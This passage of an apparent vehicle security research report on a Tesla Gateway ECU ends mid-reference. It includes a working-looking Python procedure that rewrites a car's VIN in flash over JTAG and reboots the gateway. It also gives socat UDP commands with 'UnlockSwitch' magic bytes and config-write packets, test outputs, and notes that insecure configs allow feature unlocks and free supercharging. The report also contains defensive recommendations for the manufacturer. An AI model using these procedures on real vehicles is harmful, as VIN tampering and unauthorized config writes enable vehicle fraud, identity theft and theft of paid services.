<a id=__codelineno-27-12 name=__codelineno-27-12 href=#__codelineno-27-12></a>
<a id=__codelineno-27-13 name=__codelineno-27-13 href=#__codelineno-27-13></a><span class=c1># 3. Locate VIN entry</span>
<a id=__codelineno-27-14 name=__codelineno-27-14 href=#__codelineno-27-14></a><span class=c1># Format: [CRC][Len=0x11][ID=0x0000][17-byte VIN]</span>
<a id=__codelineno-27-15 name=__codelineno-27-15 href=#__codelineno-27-15></a><span class=n>offset</span> <span class=o>=</span> <span class=n>flash</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=mh>0x19000</span><span class=p>)</span>  <span class=c1># Search config region</span>
<a id=__codelineno-27-16 name=__codelineno-27-16 href=#__codelineno-27-16></a><span class=k>while</span> <span class=n>offset</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
<a id=__codelineno-27-17 name=__codelineno-27-17 href=#__codelineno-27-17></a>    <span class=k>if</span> <span class=n>flash</span><span class=p>[</span><span class=n>offset</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=mh>0x11</span><span class=p>:</span>  <span class=c1># VIN length</span>
<a id=__codelineno-27-18 name=__codelineno-27-18 href=#__codelineno-27-18></a>        <span class=n>vin_offset</span> <span class=o>=</span> <span class=n>offset</span> <span class=o>-</span> <span class=mi>2</span>
<a id=__codelineno-27-19 name=__codelineno-27-19 href=#__codelineno-27-19></a>        <span class=n>old_vin</span> <span class=o>=</span> <span class=n>flash</span><span class=p>[</span><span class=n>vin_offset</span><span class=o>+</span><span class=mi>4</span><span class=p>:</span><span class=n>vin_offset</span><span class=o>+</span><span class=mi>21</span><span class=p>]</span>
<a id=__codelineno-27-20 name=__codelineno-27-20 href=#__codelineno-27-20></a>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;[+] Found VIN at 0x</span><span class=si>{</span><span class=n>vin_offset</span><span class=si>:</span><span class=s2>x</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>old_vin</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-27-21 name=__codelineno-27-21 href=#__codelineno-27-21></a>        <span class=k>break</span>
<a id=__codelineno-27-22 name=__codelineno-27-22 href=#__codelineno-27-22></a>    <span class=n>offset</span> <span class=o>=</span> <span class=n>flash</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>offset</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
<a id=__codelineno-27-23 name=__codelineno-27-23 href=#__codelineno-27-23></a>
<a id=__codelineno-27-24 name=__codelineno-27-24 href=#__codelineno-27-24></a><span class=c1># 4. Calculate new entry</span>
<a id=__codelineno-27-25 name=__codelineno-27-25 href=#__codelineno-27-25></a><span class=n>new_vin</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&quot;5YJSA1E26HF999999&quot;</span>
<a id=__codelineno-27-26 name=__codelineno-27-26 href=#__codelineno-27-26></a><span class=n>new_crc</span> <span class=o>=</span> <span class=n>calculate_crc8</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x11\x00\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>new_vin</span><span class=p>,</span> <span class=n>poly</span><span class=o>=</span><span class=mh>0x2F</span><span class=p>)</span>
<a id=__codelineno-27-27 name=__codelineno-27-27 href=#__codelineno-27-27></a><span class=n>new_entry</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>new_crc</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>])</span> <span class=o>+</span> <span class=n>new_vin</span>
<a id=__codelineno-27-28 name=__codelineno-27-28 href=#__codelineno-27-28></a>
<a id=__codelineno-27-29 name=__codelineno-27-29 href=#__codelineno-27-29></a><span class=c1># 5. Write to flash</span>
<a id=__codelineno-27-30 name=__codelineno-27-30 href=#__codelineno-27-30></a><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;[!] Writing new VIN: </span><span class=si>{</span><span class=n>new_vin</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-27-31 name=__codelineno-27-31 href=#__codelineno-27-31></a><span class=n>jtag_write_flash</span><span class=p>(</span><span class=n>vin_offset</span><span class=p>,</span> <span class=n>new_entry</span><span class=p>)</span>
<a id=__codelineno-27-32 name=__codelineno-27-32 href=#__codelineno-27-32></a>
<a id=__codelineno-27-33 name=__codelineno-27-33 href=#__codelineno-27-33></a><span class=c1># 6. Verify</span>
<a id=__codelineno-27-34 name=__codelineno-27-34 href=#__codelineno-27-34></a><span class=n>flash_verify</span> <span class=o>=</span> <span class=n>jtag_read_flash</span><span class=p>(</span><span class=n>vin_offset</span><span class=p>,</span> <span class=mi>21</span><span class=p>)</span>
<a id=__codelineno-27-35 name=__codelineno-27-35 href=#__codelineno-27-35></a><span class=k>if</span> <span class=n>flash_verify</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>21</span><span class=p>]</span> <span class=o>==</span> <span class=n>new_vin</span><span class=p>:</span>
<a id=__codelineno-27-36 name=__codelineno-27-36 href=#__codelineno-27-36></a>    <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] VIN changed successfully!&quot;</span><span class=p>)</span>
<a id=__codelineno-27-37 name=__codelineno-27-37 href=#__codelineno-27-37></a><span class=k>else</span><span class=p>:</span>
<a id=__codelineno-27-38 name=__codelineno-27-38 href=#__codelineno-27-38></a>    <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[-] Verification failed!&quot;</span><span class=p>)</span>
<a id=__codelineno-27-39 name=__codelineno-27-39 href=#__codelineno-27-39></a>
<a id=__codelineno-27-40 name=__codelineno-27-40 href=#__codelineno-27-40></a><span class=c1># 7. Reboot Gateway</span>
<a id=__codelineno-27-41 name=__codelineno-27-41 href=#__codelineno-27-41></a><span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[!] Rebooting Gateway...&quot;</span><span class=p>)</span>
<a id=__codelineno-27-42 name=__codelineno-27-42 href=#__codelineno-27-42></a><span class=n>jtag_reset</span><span class=p>()</span>
</code></pre></div> <p><strong>Success Rate:</strong> âœ… 100% (if you have physical access + skills)</p> <p><strong>Cost:</strong> $600-5200 (equipment) + $200-500 (BGA rework service)</p> <p><strong>Impact:</strong> CRITICAL (full vehicle compromise, identity theft)</p> <p><strong>Detection Risk:</strong> HIGH (firmware hash monitoring may alert backend)</p> <h3 id=procedure-4-factory-mode-exploit-untested>Procedure 4: Factory Mode Exploit (UNTESTED)</h3> <p><strong>Hypothesis:</strong> If devSecurityLevel (config 0x0F) can be changed via UnlockSwitch, it might disable security checks.</p> <p><strong>Steps:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-28-1 name=__codelineno-28-1 href=#__codelineno-28-1></a><span class=ch>#!/bin/bash</span>
<a id=__codelineno-28-2 name=__codelineno-28-2 href=#__codelineno-28-2></a><span class=c1># SPECULATIVE - DO NOT RUN WITHOUT TESTING!</span>
<a id=__codelineno-28-3 name=__codelineno-28-3 href=#__codelineno-28-3></a>
<a id=__codelineno-28-4 name=__codelineno-28-4 href=#__codelineno-28-4></a><span class=c1># 1. Activate factory mode</span>
<a id=__codelineno-28-5 name=__codelineno-28-5 href=#__codelineno-28-5></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;18babba0ad&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500
<a id=__codelineno-28-6 name=__codelineno-28-6 href=#__codelineno-28-6></a><span class=c1># Response: 18 01 (acknowledged)</span>
<a id=__codelineno-28-7 name=__codelineno-28-7 href=#__codelineno-28-7></a>
<a id=__codelineno-28-8 name=__codelineno-28-8 href=#__codelineno-28-8></a><span class=c1># 2. Attempt to change devSecurityLevel to factory (0x01)</span>
<a id=__codelineno-28-9 name=__codelineno-28-9 href=#__codelineno-28-9></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;0c000f01&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500
<a id=__codelineno-28-10 name=__codelineno-28-10 href=#__codelineno-28-10></a><span class=c1># Expected: ff (rejected - devSecurityLevel is likely secure)</span>
<a id=__codelineno-28-11 name=__codelineno-28-11 href=#__codelineno-28-11></a>
<a id=__codelineno-28-12 name=__codelineno-28-12 href=#__codelineno-28-12></a><span class=c1># 3. If step 2 succeeds, try VIN write</span>
<a id=__codelineno-28-13 name=__codelineno-28-13 href=#__codelineno-28-13></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;0c00005a454e4e5f544553545f56494e&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500
<a id=__codelineno-28-14 name=__codelineno-28-14 href=#__codelineno-28-14></a><span class=c1># Expected: ff (still rejected - factory mode != authentication)</span>
</code></pre></div> <p><strong>Success Rate:</strong> âŒ 0% (likely fails at step 2)</p> <p><strong>Reasoning:</strong> - devSecurityLevel is itself a secure config - Cannot be changed without Hermes auth - Chicken-and-egg problem</p> <p><strong>Impact:</strong> None (exploit doesn't work)</p> <hr> <h2 id=8-evidence>8. Evidence</h2> <h3 id=81-string-analysis>8.1 String Analysis</h3> <p><strong>Searched for signature-related strings:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-29-1 name=__codelineno-29-1 href=#__codelineno-29-1></a>grep<span class=w> </span>-i<span class=w> </span><span class=s2>&quot;signature\|verify\|sign\|hmac\|rsa&quot;</span><span class=w> </span>/data/gateway-strings.txt
<a id=__codelineno-29-2 name=__codelineno-29-2 href=#__codelineno-29-2></a><span class=c1># Result: (no output)</span>
</code></pre></div> <p><strong>Conclusion:</strong> No signature verification strings in Gateway firmware</p> <h3 id=82-crypto-function-search>8.2 Crypto Function Search</h3> <p><strong>Searched for cryptographic library symbols:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-30-1 name=__codelineno-30-1 href=#__codelineno-30-1></a>strings<span class=w> </span>/data/binaries/ryzenfromtable.bin<span class=w> </span><span class=p>|</span><span class=w> </span>grep<span class=w> </span>-iE<span class=w> </span><span class=s2>&quot;(sha256|rsa_verify|ecdsa|hmac|ed25519)&quot;</span>
<a id=__codelineno-30-2 name=__codelineno-30-2 href=#__codelineno-30-2></a><span class=c1># Result: (no output)</span>
</code></pre></div> <p><strong>Conclusion:</strong> No embedded crypto library for packet signatures</p> <h3 id=83-udp-protocol-analysis>8.3 UDP Protocol Analysis</h3> <p><strong>Verified packet format via working script:</strong></p> <p>Source: <code>/scripts/gateway_config_tool.sh</code></p> <div class=highlight><pre><span></span><code><a id=__codelineno-31-1 name=__codelineno-31-1 href=#__codelineno-31-1></a><span class=c1># SET_CONFIG command structure</span>
<a id=__codelineno-31-2 name=__codelineno-31-2 href=#__codelineno-31-2></a>set_config<span class=o>()</span><span class=w> </span><span class=o>{</span>
<a id=__codelineno-31-3 name=__codelineno-31-3 href=#__codelineno-31-3></a><span class=w>    </span><span class=nb>local</span><span class=w> </span><span class=nv>CMD_HEX</span><span class=o>=</span><span class=s2>&quot;</span><span class=nv>$1</span><span class=s2>&quot;</span>
<a id=__codelineno-31-4 name=__codelineno-31-4 href=#__codelineno-31-4></a><span class=w>    </span><span class=nb>echo</span><span class=w> </span><span class=nv>$CMD_HEX</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span>&gt;<span class=w> </span>cmd
<a id=__codelineno-31-5 name=__codelineno-31-5 href=#__codelineno-31-5></a>
<a id=__codelineno-31-6 name=__codelineno-31-6 href=#__codelineno-31-6></a><span class=w>    </span><span class=c1># Send UDP packet</span>
<a id=__codelineno-31-7 name=__codelineno-31-7 href=#__codelineno-31-7></a><span class=w>    </span><span class=nv>RSP</span><span class=o>=</span><span class=k>$(</span>cat<span class=w> </span>cmd<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500<span class=w> </span><span class=p>|</span><span class=w> </span>hexdump<span class=w> </span>-v<span class=w> </span>-e<span class=w> </span><span class=s1>&#39;1/1 &quot;%02x&quot;&#39;</span><span class=k>)</span>
<a id=__codelineno-31-8 name=__codelineno-31-8 href=#__codelineno-31-8></a>
<a id=__codelineno-31-9 name=__codelineno-31-9 href=#__codelineno-31-9></a><span class=w>    </span><span class=c1># Check response</span>
<a id=__codelineno-31-10 name=__codelineno-31-10 href=#__codelineno-31-10></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=o>[</span><span class=w> </span><span class=s2>&quot;</span><span class=nv>$RSP</span><span class=s2>&quot;</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=s2>&quot;</span><span class=nv>$CMD_HEX</span><span class=s2>&quot;</span><span class=w> </span><span class=o>]</span><span class=p>;</span><span class=w> </span><span class=k>then</span>
<a id=__codelineno-31-11 name=__codelineno-31-11 href=#__codelineno-31-11></a><span class=w>        </span><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;[SUCCESS]&quot;</span>
<a id=__codelineno-31-12 name=__codelineno-31-12 href=#__codelineno-31-12></a><span class=w>    </span><span class=k>elif</span><span class=w> </span><span class=o>[</span><span class=w> </span><span class=s2>&quot;</span><span class=nv>$RSP</span><span class=s2>&quot;</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=s2>&quot;ff&quot;</span><span class=w> </span><span class=o>]</span><span class=p>;</span><span class=w> </span><span class=k>then</span>
<a id=__codelineno-31-13 name=__codelineno-31-13 href=#__codelineno-31-13></a><span class=w>        </span><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;[FAIL] Config is secured&quot;</span>
<a id=__codelineno-31-14 name=__codelineno-31-14 href=#__codelineno-31-14></a><span class=w>    </span><span class=k>fi</span>
<a id=__codelineno-31-15 name=__codelineno-31-15 href=#__codelineno-31-15></a><span class=o>}</span>
</code></pre></div> <p><strong>Evidence:</strong> No signature bytes appended, no signature flag in packet</p> <h3 id=84-hermes-client-analysis>8.4 Hermes Client Analysis</h3> <p><strong>Source:</strong> <code>/docs/core/HERMES-CLIENT-ANALYSIS.md</code></p> <p><strong>Key Findings:</strong> - Hermes provides session-based authentication - No per-command signatures - Backend sends AUTH_GRANTED message - Gateway caches authorization state</p> <p><strong>Relevant Strings:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-32-1 name=__codelineno-32-1 href=#__codelineno-32-1></a>- &quot;SafeToMigrate&quot;
<a id=__codelineno-32-2 name=__codelineno-32-2 href=#__codelineno-32-2></a>- &quot;bypass_delivered_check&quot;
<a id=__codelineno-32-3 name=__codelineno-32-3 href=#__codelineno-32-3></a>- &quot;phone_home_session&quot;
<a id=__codelineno-32-4 name=__codelineno-32-4 href=#__codelineno-32-4></a>- &quot;validate_and_save_certificate&quot;
</code></pre></div></p> <p><strong>No Strings Related To:</strong> - "sign_command" - "verify_packet_signature" - "compute_hmac"</p> <p><strong>Conclusion:</strong> Hermes authentication is session-level, not packet-level</p> <h3 id=85-gateway-firmware-disassembly>8.5 Gateway Firmware Disassembly</h3> <p><strong>Source:</strong> <code>/data/gateway_full_disassembly.txt</code></p> <p><strong>Searched for:</strong> - 0xff response code handling - Secure config table - Authentication check logic</p> <p><strong>Found:</strong> (Limited - firmware is stripped, no symbol names)</p> <p><strong>Example Assembly Pattern (Hypothetical):</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-33-1 name=__codelineno-33-1 href=#__codelineno-33-1></a><span class=c1>; Config ID validation (not found yet, but expected pattern)</span>
<a id=__codelineno-33-2 name=__codelineno-33-2 href=#__codelineno-33-2></a><span class=nl>handle_set_config:</span>
<a id=__codelineno-33-3 name=__codelineno-33-3 href=#__codelineno-33-3></a><span class=w>    </span><span class=nf>lhz</span><span class=w>     </span><span class=no>r5</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>(</span><span class=no>r3</span><span class=p>)</span><span class=w>        </span><span class=c1>; Load config_id from packet[2:3]</span>
<a id=__codelineno-33-4 name=__codelineno-33-4 href=#__codelineno-33-4></a><span class=w>    </span><span class=nf>lis</span><span class=w>     </span><span class=no>r6</span><span class=p>,</span><span class=w> </span><span class=no>secure_configs@ha</span>
<a id=__codelineno-33-5 name=__codelineno-33-5 href=#__codelineno-33-5></a><span class=w>    </span><span class=nf>la</span><span class=w>      </span><span class=no>r6</span><span class=p>,</span><span class=w> </span><span class=no>secure_configs@l</span><span class=p>(</span><span class=no>r6</span><span class=p>)</span>
<a id=__codelineno-33-6 name=__codelineno-33-6 href=#__codelineno-33-6></a>
<a id=__codelineno-33-7 name=__codelineno-33-7 href=#__codelineno-33-7></a><span class=nl>.loop:</span>
<a id=__codelineno-33-8 name=__codelineno-33-8 href=#__codelineno-33-8></a><span class=w>    </span><span class=nf>lhz</span><span class=w>     </span><span class=no>r7</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>(</span><span class=no>r6</span><span class=p>)</span><span class=w>        </span><span class=c1>; Load entry from secure_configs[]</span>
<a id=__codelineno-33-9 name=__codelineno-33-9 href=#__codelineno-33-9></a><span class=w>    </span><span class=nf>cmpw</span><span class=w>    </span><span class=no>r7</span><span class=p>,</span><span class=w> </span><span class=no>r5</span><span class=w>           </span><span class=c1>; Compare with config_id</span>
<a id=__codelineno-33-10 name=__codelineno-33-10 href=#__codelineno-33-10></a><span class=w>    </span><span class=nf>beq</span><span class=w>     </span><span class=no>.is_secure</span><span class=w>       </span><span class=c1>; Match found</span>
<a id=__codelineno-33-11 name=__codelineno-33-11 href=#__codelineno-33-11></a><span class=w>    </span><span class=nf>addi</span><span class=w>    </span><span class=no>r6</span><span class=p>,</span><span class=w> </span><span class=no>r6</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=w>        </span><span class=c1>; Next entry</span>
<a id=__codelineno-33-12 name=__codelineno-33-12 href=#__codelineno-33-12></a><span class=w>    </span><span class=nf>cmpwi</span><span class=w>   </span><span class=no>r7</span><span class=p>,</span><span class=w> </span><span class=mi>0xFFFF</span><span class=w>       </span><span class=c1>; End marker?</span>
<a id=__codelineno-33-13 name=__codelineno-33-13 href=#__codelineno-33-13></a><span class=w>    </span><span class=nf>bne</span><span class=w>     </span><span class=no>.loop</span>
<a id=__codelineno-33-14 name=__codelineno-33-14 href=#__codelineno-33-14></a>
<a id=__codelineno-33-15 name=__codelineno-33-15 href=#__codelineno-33-15></a><span class=nl>.is_insecure:</span>
<a id=__codelineno-33-16 name=__codelineno-33-16 href=#__codelineno-33-16></a><span class=w>    </span><span class=nf>b</span><span class=w>       </span><span class=no>write_config</span><span class=w>     </span><span class=c1>; Not in list, allow write</span>
<a id=__codelineno-33-17 name=__codelineno-33-17 href=#__codelineno-33-17></a>
<a id=__codelineno-33-18 name=__codelineno-33-18 href=#__codelineno-33-18></a><span class=nl>.is_secure:</span>
<a id=__codelineno-33-19 name=__codelineno-33-19 href=#__codelineno-33-19></a><span class=w>    </span><span class=nf>lbz</span><span class=w>     </span><span class=no>r8</span><span class=p>,</span><span class=w> </span><span class=no>session_authenticated</span>
<a id=__codelineno-33-20 name=__codelineno-33-20 href=#__codelineno-33-20></a><span class=w>    </span><span class=nf>cmpwi</span><span class=w>   </span><span class=no>r8</span><span class=p>,</span><span class=w> </span><span class=mi>0</span>
<a id=__codelineno-33-21 name=__codelineno-33-21 href=#__codelineno-33-21></a><span class=w>    </span><span class=nf>beq</span><span class=w>     </span><span class=no>.reject</span><span class=w>          </span><span class=c1>; Not authenticated</span>
<a id=__codelineno-33-22 name=__codelineno-33-22 href=#__codelineno-33-22></a><span class=w>    </span><span class=nf>b</span><span class=w>       </span><span class=no>write_config</span><span class=w>     </span><span class=c1>; Authenticated, allow</span>
<a id=__codelineno-33-23 name=__codelineno-33-23 href=#__codelineno-33-23></a>
<a id=__codelineno-33-24 name=__codelineno-33-24 href=#__codelineno-33-24></a><span class=nl>.reject:</span>
<a id=__codelineno-33-25 name=__codelineno-33-25 href=#__codelineno-33-25></a><span class=w>    </span><span class=nf>li</span><span class=w>      </span><span class=no>r3</span><span class=p>,</span><span class=w> </span><span class=mi>0xFF</span><span class=w>         </span><span class=c1>; Return 0xff</span>
<a id=__codelineno-33-26 name=__codelineno-33-26 href=#__codelineno-33-26></a><span class=w>    </span><span class=nf>blr</span>
</code></pre></div> <p><strong>Status:</strong> âš ï¸ Assembly not extracted yet (handler not located)</p> <h3 id=86-test-results>8.6 Test Results</h3> <p><strong>Test: VIN write via UDP (No Authentication)</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-34-1 name=__codelineno-34-1 href=#__codelineno-34-1></a>$<span class=w> </span><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;0c00005a454e4e5f544553545f56494e&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500<span class=w> </span><span class=p>|</span><span class=w> </span>hexdump<span class=w> </span>-C
<a id=__codelineno-34-2 name=__codelineno-34-2 href=#__codelineno-34-2></a><span class=m>00000000</span><span class=w>  </span>ff<span class=w>                                                </span><span class=p>|</span>.<span class=p>|</span>
<a id=__codelineno-34-3 name=__codelineno-34-3 href=#__codelineno-34-3></a><span class=m>00000001</span>
</code></pre></div> <p><strong>Result:</strong> âœ… Confirmed - Gateway rejects with 0xff (secure config, no auth)</p> <p><strong>Test: Map region write via UDP (No Authentication)</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-35-1 name=__codelineno-35-1 href=#__codelineno-35-1></a>$<span class=w> </span><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;0c004201&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500<span class=w> </span><span class=p>|</span><span class=w> </span>hexdump<span class=w> </span>-C
<a id=__codelineno-35-2 name=__codelineno-35-2 href=#__codelineno-35-2></a><span class=m>00000000</span><span class=w>  </span>0c<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>01</span><span class=w>                                       </span><span class=p>|</span>..B.<span class=p>|</span>
<a id=__codelineno-35-3 name=__codelineno-35-3 href=#__codelineno-35-3></a><span class=m>00000004</span>
</code></pre></div> <p><strong>Result:</strong> âœ… Confirmed - Gateway accepts (insecure config, echoes back)</p> <h3 id=87-cross-references>8.7 Cross-References</h3> <p><strong>Related Documents:</strong></p> <ol> <li><strong>GATEWAY-UDP-PROTOCOL-VERIFIED.md</strong></li> <li>Verified UDP protocol structure</li> <li>Working exploit for insecure configs</li> <li> <p>0xff response documented</p> </li> <li> <p><strong>SET-CONFIG-VALIDATION-LOGIC.md</strong></p> </li> <li>Config validation flow</li> <li>Security level checking</li> <li> <p>Two-tier security model</p> </li> <li> <p><strong>81-gateway-secure-configs-CRITICAL.md</strong></p> </li> <li>Secure vs insecure config classification</li> <li>gw-diag tool usage</li> <li> <p>"extra params or extra hex" quote</p> </li> <li> <p><strong>HERMES-CLIENT-ANALYSIS.md</strong></p> </li> <li>Session-based authentication</li> <li>Phone-home mechanism</li> <li> <p>No per-command signatures</p> </li> <li> <p><strong>52-gateway-firmware-decompile.md</strong></p> </li> <li>UnlockSwitch (0x18BABBA0AD) definition</li> <li>Factory gate mechanism</li> <li>Command dispatch table</li> </ol> <hr> <h2 id=9-conclusion>9. Conclusion</h2> <h3 id=what-we-learned>What We Learned</h3> <ol> <li><strong>"Signed Commands" Don't Exist</strong></li> <li>Gateway does NOT use cryptographic signatures on UDP packets</li> <li>Security is config-based, not packet-based</li> <li> <p>Authentication is session-based (Hermes), not per-command</p> </li> <li> <p><strong>0xff Response Meaning</strong></p> </li> <li>NOT "invalid signature"</li> <li>ACTUALLY "secure config, no authentication"</li> <li> <p>Gateway checks session flag, not packet contents</p> </li> <li> <p><strong>UnlockSwitch Purpose</strong></p> </li> <li>Enables factory diagnostic mode</li> <li>Opens emergency port UDP:25956</li> <li> <p>Does NOT bypass secure config protection</p> </li> <li> <p><strong>VIN Change Impossible via UDP Alone</strong></p> </li> <li>VIN (config 0x0000) is hardcoded secure</li> <li>Requires active Hermes session</li> <li> <p>Backend likely monitors VIN changes</p> </li> <li> <p><strong>Physical Bypass Works</strong></p> </li> <li>JTAG flash modification bypasses ALL software security</li> <li>Cost: $600-5200 + technical skills</li> <li>Detection risk: Firmware hash monitoring</li> </ol> <h3 id=security-assessment>Security Assessment</h3> <p><strong>Strengths:</strong> - âœ… Effective separation of secure vs insecure configs - âœ… Session-based authentication prevents unauthorized secure writes - âœ… Backend monitoring provides defense-in-depth - âœ… mTLS on Hermes prevents easy MITM</p> <p><strong>Weaknesses:</strong> - âš ï¸ No physical security (JTAG bypass trivial for skilled attacker) - âš ï¸ No firmware integrity monitoring (hash configs exist but enforcement unknown) - âš ï¸ Insecure configs can be abused (free supercharging, feature unlocks) - âš ï¸ UnlockSwitch command easily discoverable (magic bytes in script)</p> <p><strong>Overall:</strong> âš ï¸ MEDIUM-HIGH - Good network security, poor physical security</p> <h3 id=vin-change-verdict>VIN Change Verdict</h3> <p><strong>Can we change VIN?</strong></p> <table> <thead> <tr> <th>Method</th> <th>Success</th> <th>Requirements</th> <th>Detection</th> </tr> </thead> <tbody> <tr> <td>UDP:3500 (no auth)</td> <td>âŒ NO</td> <td>None</td> <td>N/A</td> </tr> <tr> <td>UDP:3500 + UnlockSwitch</td> <td>âŒ NO</td> <td>Magic bytes</td> <td>N/A</td> </tr> <tr> <td>Hermes + gw-diag</td> <td>âœ… YES</td> <td>Tesla credentials</td> <td>ğŸ”´ HIGH (audit logs)</td> </tr> <tr> <td>JTAG flash mod</td> <td>âœ… YES</td> <td>Physical access + equipment</td> <td>ğŸŸ¡ MEDIUM (hash monitoring)</td> </tr> <tr> <td>Firmware exploit</td> <td>â“ MAYBE</td> <td>Code execution vulnerability</td> <td>âš ï¸ UNKNOWN</td> </tr> </tbody> </table> <p><strong>Recommendation:</strong> VIN tampering is <strong>technically possible</strong> but <strong>highly detectable</strong>. Not recommended for fraud (legal consequences severe).</p> <hr> <h2 id=10-future-research>10. Future Research</h2> <h3 id=open-questions>Open Questions</h3> <ol> <li><strong>Exact secure config list</strong></li> <li>Which config IDs beyond 0x00 and 0x06 are secure?</li> <li> <p>Test all 662 configs systematically</p> </li> <li> <p><strong>Hermes AUTH_GRANTED format</strong></p> </li> <li>Extract protobuf schema</li> <li>Identify permission flags</li> <li> <p>Test token replay</p> </li> <li> <p><strong>Emergency port UDP:25956</strong></p> </li> <li>What API does UnlockSwitch enable?</li> <li>Can it bypass secure config protection?</li> <li> <p>Fuzzing for vulnerabilities</p> </li> <li> <p><strong>Firmware hash monitoring</strong></p> </li> <li>Do configs 0x0025/0x0026 enforce integrity?</li> <li>How often does backend check hashes?</li> <li> <p>Can we defeat monitoring?</p> </li> <li> <p><strong>devSecurityLevel behavior</strong></p> </li> <li>What does factory mode (level 1) actually enable?</li> <li>Can we exploit level transitions?</li> <li>Test on live Gateway</li> </ol> <h3 id=recommended-actions>Recommended Actions</h3> <p><strong>For Researchers:</strong> 1. Test UnlockSwitch on live Gateway (safe, reversible) 2. Capture Hermes session traffic (ethical MITM with consent) 3. Fuzz UDP:25956 after UnlockSwitch (search for exploits) 4. Map all 662 configs (secure vs insecure classification)</p> <p><strong>For Tesla:</strong> 1. Disable UDP:3500 writes for feature-unlocking configs (supercharging, performance) 2. Add firmware integrity monitoring (enforce hash checks) 3. Implement physical tamper detection (seal Gateway enclosure) 4. Require backend validation for all secure config changes (not just session auth) 5. Rotate prodCodeKey/prodCmdKey periodically (limit stolen key impact)</p> <hr> <h2 id=references>References</h2> <h3 id=primary-sources>Primary Sources</h3> <ul> <li><code>/docs/gateway/GATEWAY-UDP-PROTOCOL-VERIFIED.md</code> - UDP protocol verification</li> <li><code>/docs/gateway/SET-CONFIG-VALIDATION-LOGIC.md</code> - Config validation flow</li> <li><code>/docs/gateway/81-gateway-secure-configs-CRITICAL.md</code> - Security model</li> <li><code>/docs/core/HERMES-CLIENT-ANALYSIS.md</code> - Hermes authentication</li> <li><code>/docs/gateway/52-gateway-firmware-decompile.md</code> - UnlockSwitch definition</li> <li><code>/scripts/gateway_config_tool.sh</code> - Working exploit script</li> </ul> <h3 id=tools-used>Tools Used</h3> <ul> <li><code>socat</code> - UDP packet transmission</li> <li><code>xxd</code> - Hex encoding/decoding</li> <li><code>hexdump</code> - Response visualization</li> <li><code>grep</code> - String/pattern searching</li> <li>PowerPC disassembler (Ghidra/IDA hypothetical)</li> </ul> <h3 id=external-references>External References</h3> <ul> <li>Tesla Gateway MPC5748G datasheet (Freescale/NXP)</li> <li>Hermes Protocol (inferred from binary 